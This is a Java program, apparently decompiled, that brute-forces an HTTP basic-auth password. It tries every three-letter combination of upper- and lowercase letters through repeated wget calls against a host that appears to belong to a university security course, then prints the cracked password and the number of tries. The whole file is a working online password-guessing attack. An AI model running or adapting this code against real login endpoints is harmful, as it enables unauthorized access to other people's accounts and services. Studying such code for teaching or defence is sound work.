public class BruteForce {
    public BruteForce() {
        super();
    }
    public static void main ( String[] a ) {
        String s = new String ( "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" );
        int i = s.length();
        int i0 = 0;
        int i1 = 0;
        while ( i1 < i ) {
            int i2 = 0;
            while ( i2 < i ) {
                int i3 = 0;
                while ( i3 < i ) {
                    try {
                        StringBuilder a0 = new StringBuilder();
                        int i4 = s.charAt ( i1 );
                        StringBuilder a1 = a0.append ( String.valueOf ( ( char ) i4 ) );
                        int i5 = s.charAt ( i2 );
                        StringBuilder a2 = a1.append ( String.valueOf ( ( char ) i5 ) );
                        int i6 = s.charAt ( i3 );
                        String s0 = a2.append ( String.valueOf ( ( char ) i6 ) ).toString();
                        java.io.PrintStream a3 = System.out;
                        int i7 = s.charAt ( i1 );
                        a3.print ( ( char ) i7 );
                        java.io.PrintStream a4 = System.out;
                        int i8 = s.charAt ( i2 );
                        a4.print ( ( char ) i8 );
                        java.io.PrintStream a5 = System.out;
                        int i9 = s.charAt ( i3 );
                        a5.println ( ( char ) i9 );
                        Process a6 = Runtime.getRuntime().exec ( new StringBuilder ( "wget --http-user= --http-passwd=" ).append ( s0 ).append ( " " ).append ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).toString() );
                        java.io.BufferedReader a7 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( a6.getInputStream() ) );
                        java.io.BufferedReader a8 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( a6.getErrorStream() ) );
                        while ( true ) {
                            String s1 = a7.readLine();
                            if ( s1 == null ) {
                                break;
                            }
                            System.out.println ( s1 );
                        }
                        while ( true ) {
                            String s2 = a8.readLine();
                            if ( s2 == null ) {
                                break;
                            }
                            System.out.println ( s2 );
                        }
                        try {
                            a6.waitFor();
                        } catch ( InterruptedException ignoredException ) {
                        }
                        i0 = i0 + 1;
                        if ( a6.exitValue() == 0 ) {
                            System.out.println ( new StringBuilder ( "**********PASSWORD IS: " ).append ( s0 ).toString() );
                            System.out.println ( new StringBuilder ( "**********NUMBER OF TRIES: " ).append ( i0 ).toString() );
                            System.exit ( 1 );
                        }
                    } catch ( java.io.IOException a9 ) {
                        System.out.println ( "exception happened - here's what I know: " );
                        a9.printStackTrace();
                        System.exit ( -1 );
                    }
                    i3 = i3 + 1;
                }
                i2 = i2 + 1;
            }
            i1 = i1 + 1;
        }
    }
}
